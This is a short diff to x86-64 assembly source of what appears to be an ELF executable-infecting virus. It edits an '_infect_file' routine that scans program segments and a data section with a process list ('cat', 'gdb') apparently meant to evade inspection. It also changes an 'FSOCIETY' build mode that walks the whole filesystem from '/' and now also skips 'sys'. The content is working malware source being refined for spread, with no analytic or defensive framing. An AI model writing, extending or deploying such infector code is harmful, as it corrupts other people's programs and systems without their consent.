@@ -407,7 +407,7 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rdi, [rbx + 8]; p_offset
 			add rdi, r13
 			mov rsi, [rbx + 32]; p_filesz
-			cmp rsi, rdx
+			cmp rsi, rcx
 			jl .unmap
 			call _ft_memmem
 			cmp rax, 0x0
@@ -779,7 +779,7 @@ process db `cat`, 0x0, `gdb`, 0x0, 0x0
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %ifdef FSOCIETY
 	directories db `/`, 0x0, 0x0
-	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, 0x0
+	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, `sys`, 0x0, 0x0
 %else
 	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, 0x0
